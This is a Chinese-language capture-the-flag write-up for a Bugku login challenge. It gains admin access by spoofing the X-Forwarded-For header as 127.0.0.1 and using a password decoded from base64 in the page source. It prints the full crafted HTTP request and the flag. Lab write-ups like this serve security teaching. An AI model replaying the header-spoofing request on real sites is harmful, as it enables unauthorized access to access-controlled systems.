# Bugku CTF WriteUp：本地管理员登录绕过

## 题目信息

- 题目场景：管理员登录页面，提示“IP禁止访问，请联系本地管理员登陆，IP已被记录”。

- 目标：获取登录后的flag。

---

## 解题思路

1. **IP限制绕过**：页面提示需要本地管理员登录，说明后端对访问IP做了限制。可以通过添加`X-Forwarded-For`请求头，伪造本地IP（[127.0.0.1](127.0.0.1)）来绕过限制。

2. **密码获取**：在绕过IP限制后，尝试SQL注入未果，转而查看页面源码，发现其中包含base64编码的注释，解码后得到密码。

3. **登录获取flag**：使用已知的管理员用户名`admin`和解码得到的密码，通过Burp Repeater发送登录请求，成功获取flag。

---

## 详细步骤

### 1. 绕过IP限制

- 打开Burp Suite，开启代理，拦截浏览器的登录请求。

- 在请求头中添加：

    ```HTTP
    
    X-Forwarded-For: 127.0.0.1
    ```

- 发送修改后的请求，成功绕过IP限制，页面正常显示登录表单。

### 2. 获取登录密码

- 查看页面源码，发现有一段base64编码的注释。

- 对其进行base64解码，得到密码：`test123`。

### 3. 发送登录请求获取flag

- 在Burp Repeater中构造登录POST请求，参数为：

    ```HTTP
    
    user=admin&pass=test123
    ```

- 同时保留`X-Forwarded-For: 127.0.0.1`请求头。

- 发送请求后，响应页面中直接显示flag：

    ```Plain Text
    
    flag{9263419a793f55d5a96122996abb58f25}
    ```

---

## 关键请求包示例

```HTTP

POST / HTTP/1.1
Host: 171.80.2.169:15417
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:100.0) Gecko/20100101 Firefox/100.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 25
Origin: http://171.80.2.169:15417
Connection: keep-alive
Referer: http://171.80.2.169:15417/
Upgrade-Insecure-Requests: 1
X-Forwarded-For: 127.0.0.1

user=admin&pass=test123
```

---

## 最终flag

`flag{9263419a793f55d5a96122996abb58f25}`
> （注：文档部分内容可能由 AI 生成）